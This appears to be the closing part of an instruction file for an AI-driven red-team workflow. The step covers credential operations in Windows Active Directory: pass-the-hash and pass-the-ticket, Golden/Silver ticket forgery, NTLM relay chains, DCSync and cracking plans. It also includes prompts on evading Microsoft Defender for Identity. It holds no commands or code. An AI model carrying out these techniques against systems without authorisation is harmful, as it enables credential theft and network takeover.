{{manipulation_matrix — prepared PtH/PtT/OPtH/Golden/Silver attacks}}

### NTLM Relay Infrastructure
{{relay_plan — targets, coercion methods, relay chains, feasibility}}

### Credential→Target Map
{{credential_target_map — comprehensive correlation matrix}}

### Offline Cracking Status
{{cracking_plan — hash types, modes, estimated times, results}}

### OPSEC Log
{{opsec_events — all detection events generated during credential operations}}
```

### 9. Present MENU OPTIONS

"**Credential operations and relay setup complete.**

Summary: {{total_creds}} credentials harvested — {{cleartext_count}} cleartext, {{hash_count}} hashes, {{ticket_count}} tickets, {{key_count}} keys/certificates.
Prepared attacks: {{pth_count}} PtH, {{ptt_count}} PtT, {{opth_count}} OPtH, {{golden}} Golden, {{silver}} Silver Tickets.
Relay feasibility: {{relay_count}} viable relay chains against {{relay_target_count}} targets.
Target coverage: {{covered_count}}/{{total_targets}} priority targets have credential coverage.

**Select an option:**
[A] Advanced Elicitation — Deep analysis of credential chains, relay timing optimization, cracking prioritization
[W] War Room — Red (credential exploitation paths, relay chain sequencing, ticket forgery optimization) vs Blue (credential monitoring gaps, relay detection capabilities, LSASS protection assessment)
[C] Continue — Proceed to Step 4: Windows Lateral Movement"

#### Menu Handling Logic:

- IF A: Deep-dive analysis of credential relationships — explore password reuse patterns across accounts, assess ticket forgery parameter optimization (realistic lifetimes, encryption types), evaluate relay chain timing and sequencing, investigate credential chains that span multiple trust boundaries, prioritize cracking targets by lateral movement impact. Process insights, ask user if they want to update findings, if yes update then redisplay menu, if no redisplay menu
- IF W: War Room discussion — Red Team perspective: which credentials provide the fastest path to each priority target? What is the optimal credential usage sequence to minimize detection? Can relay chains be combined for domain escalation (e.g., PetitPotam → ADCS → DA)? Which ticket forgery parameters evade MDI? Blue Team perspective: which credential stores were inadequately protected? What monitoring is missing on LSASS access? Are NTLM relay mitigations (SMB signing, LDAP signing, EPA) sufficient? How should credential hygiene and rotation be improved? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to the end of stepsCompleted array, then read fully and follow: ./step-04-windows-lateral.md
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and credential operations findings appended to report], will you then read fully and follow: `./step-04-windows-lateral.md` to begin Windows lateral movement.

---

## SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- All existing credentials from prior phases inventoried with type, scope, and verification status
- Local credential extraction executed on all compromised systems with EDR evasion assessment
- Domain credential operations completed (Kerberoasting, AS-REP, DCSync if applicable, GPP, LAPS, gMSA)
- Credential manipulation techniques prepared (PtH, PtT, OPtH, Golden/Silver Tickets, certificate auth)
- NTLM relay feasibility assessed with coercion techniques, relay targets, and infrastructure plan
- Comprehensive Credential→Target Map built with confidence levels (Verified/Likely/Speculative)
- Offline cracking plan created with hash types, modes, and estimated times
- Every credential logged with source, account, type, format, scope, and verification status
- OPSEC events from credential operations documented
- Findings appended to report under `## Credential Operations & Relay Setup`
- Menu presented and user input handled correctly
- Frontmatter updated with this step name added to stepsCompleted

### ❌ SYSTEM FAILURE:

- Executing lateral movement during credential operations (that is steps 04-07)
- Accessing LSASS without EDR evasion assessment
- Running DCSync without DA confirmation and operator approval
- Not building the Credential→Target Map (steps 04-07 depend on this)
- Mass credential spraying without lockout policy validation
- Not cataloguing every credential with source, type, and scope
- Ignoring relay feasibility when SMB signing is disabled on targets
- Not preparing credential manipulation techniques for available hash types
- Proceeding without user selecting 'C' (Continue)
- Not documenting OPSEC events from extraction activities

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. This is CREDENTIAL PREPARATION — no lateral movement. Every credential must be inventoried, every manipulation technique prepared, every relay chain assessed.
